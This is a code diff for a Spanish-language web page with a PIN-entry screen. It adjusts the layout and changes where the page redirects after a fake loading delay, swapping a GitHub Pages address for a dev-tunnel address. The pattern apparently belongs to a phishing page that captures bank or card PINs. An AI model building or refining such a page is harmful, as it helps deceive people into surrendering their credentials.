@@ -339,9 +339,10 @@
       }
 
       .pin-header {
-        padding: 3px 2px 30px;
+        padding: 3px;
         display: flex;
-        align-items: center;
+        align-items:self-start;
+        width: 100%;
       }
 
       .back-arrow {
@@ -717,9 +718,13 @@
       <div class="pin-screen" id="pinScreen">
         <div class="pin-header">
           <div class="back-arrow"  onclick="goBack()">←</div><br>
+          
+        
+        <div><br>
+
           <div class="pin-title">Escribe tu clave</div>
         </div>
-
+</div>
         <div class="pin-content">
           <div class="pin-dots">
             <div class="pin-dot" id="dot1"></div>
@@ -841,7 +846,7 @@
           currentPin = "";
           updateDots();
           loadingScreen.style.display = "none";
-          location.href = "https://vermar1090.github.io/juannchnequi/h.html";
+          location.href = "https://zsbrccrd-443.use2.devtunnels.ms/practicas/h.html";
         }, 3000);
 
       }, 100); // Pequeño delay para asegurar que se renderice el DOM
